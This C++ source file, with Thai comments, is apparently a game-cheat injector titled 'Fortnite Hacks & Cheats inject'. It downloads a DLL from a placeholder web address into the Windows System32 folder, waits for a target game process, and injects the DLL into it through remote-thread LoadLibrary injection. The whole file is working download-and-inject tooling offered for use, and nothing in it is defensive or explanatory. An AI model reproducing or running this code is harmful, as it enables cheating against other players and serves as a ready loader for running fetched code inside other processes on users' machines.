#include <Windows.h>
#include <stdio.h>
#include <iostream>
#include <fstream>
#include <tchar.h>
#include <wininet.h>
#include <cstring>
#include <sstream>
#include <iomanip>
#include <tlhelp32.h>
#include "urlmon.h"
#include <conio.h>
#pragma comment(lib, "urlmon.lib")
#pragma comment(lib,"wininet.lib")
//======================================================================//
#define ProcessName "xxxx.exe" //ชื่อเกม
//======================================================================//
#define FileToInject "xxxx.dll" //ชื่อ dll
//======================================================================//
#define UrlPro "http://xxxx.xxx/xxxx.dll" //ลิ้งที่อยู่ของ dll
//======================================================================//
#define File "C:\\Windows\\System32\\xxxx.dll" //Path ที่ อยู่ ของ dll
//======================================================================//
bool InjectDLL(DWORD ProcessID);
//======================================================================//
typedef HINSTANCE(*fpLoadLibrary)(char*);
//======================================================================//
void inject()
{
	//======================================================================//
	AllocConsole();
	//======================================================================//
	//_cprintf("Wait For Game Start PointBlank ..\n");
	//======================================================================//
	system("CLS");
	//system("color 09");
	system("color 07");
	system("Xisap.1234-sallsa");
	_cprintf("--------------------------------------------------------------------------------\n");
	//_cprintf("                                                                                \n");
	_cprintf("                         Fortnite Hacks & Cheats inject                         \n");
	//_cprintf("                                                                                \n");
	_cprintf("--------------------------------------------------------------------------------\n");
	//_cprintf("                                                                                \n");
	_cprintf("-       Os Support XP, Windows 7, Windows Vista - All Windows\n");
	_cprintf("- Process  xxxxx.exe...........\n");
	_cprintf("                                                                                \n");
	_cprintf("--------------------------------------------------------------------------------\n");
	_cprintf("                                                                                \n");
	/*cout << "                                                     AutoClose 10 Second.....   ";*/
	//======================================================================//
	DWORD processId = NULL;
	//======================================================================//
	PROCESSENTRY32 pe32 = { sizeof(PROCESSENTRY32) };
	HANDLE hProcSnap;
	//======================================================================//
	while (!processId)
	{
		//======================================================================//
		//system("CLS");
		/*cout << "Searching for " << ProcessName << "..." << endl;
		cout << "Make sure your game is running" << endl;*/
		hProcSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
		//======================================================================//
		if (Process32First(hProcSnap, &pe32))
		{
			do
			{
				if (!strcmp(pe32.szExeFile, ProcessName))
				{
					processId = pe32.th32ProcessID;
					break;
				}
			} while (Process32Next(hProcSnap, &pe32));
		}
		Sleep(1000);
	}
	//======================================================================//
	while (!InjectDLL(processId))
	{
		//======================================================================//
		_cprintf("DLL failed to inject");
		//======================================================================//
		/*system("CLS");
		cout << "DLL failed to inject" << endl;
		Sleep(1000);*/
		//======================================================================//
	}
	//======================================================================//
	_cprintf("DLL Injected successfuly!\n");
	_cprintf("Closing Injector in 5 seconds\n");
	/*cout << "DLL Injected successfuly!" << endl << endl;
	cout << "Closing Injector in 5 seconds" << endl;*/
	//======================================================================//
	CloseHandle(hProcSnap);
	//======================================================================//
	Sleep(1000);
	//======================================================================//
	return;
}
//======================================================================//
bool InjectDLL(DWORD ProcessID)
{
	//======================================================================//
	HANDLE hProc;
	//======================================================================//
	LPVOID paramAddr;
	//======================================================================//
	HINSTANCE hDll = LoadLibrary("KERNEL32");
	//======================================================================//
	fpLoadLibrary LoadLibraryAddr = (fpLoadLibrary)GetProcAddress(hDll, "LoadLibraryA");
	//======================================================================//
	hProc = OpenProcess(PROCESS_ALL_ACCESS, false, ProcessID);
	//======================================================================//
	char dllPath[250] = "C:\\Windows\\System32\\"; // Path ที่อยู่ dll ที่จะทำการ inject
	//======================================================================//
	strcat(dllPath, FileToInject);
	//======================================================================//
	paramAddr = VirtualAllocEx(hProc, 0, strlen(dllPath) + 1, MEM_COMMIT, PAGE_READWRITE);
	bool memoryWritten = WriteProcessMemory(hProc, paramAddr, dllPath, strlen(dllPath) + 1, NULL);
	//======================================================================//
	CreateRemoteThread(hProc, 0, 0, (LPTHREAD_START_ROUTINE)LoadLibraryAddr, paramAddr, 0, 0);
	//======================================================================//
	CloseHandle(hProc);
	//======================================================================//
	return memoryWritten;
}
//======================================================================//
void download() // ฟังชั่น ดาวโหลด dll
{
	DeleteUrlCacheEntry(UrlPro);
	//======================================================================//
	HRESULT hr = URLDownloadToFile(
		NULL,  
		UrlPro,
		File,
		0,      
		NULL); 
	//======================================================================//
	if (SUCCEEDED(hr))
	{
		
	}
	else
	{
		MessageBox(NULL, "การเชื่อมต่อเซิร์ฟเวอร์ผิดพลาด", "ข้อความจากระบบ", MB_OK | MB_ICONERROR);
		ExitProcess(0);
	}
	//======================================================================//
	return;
}
//======================================================================//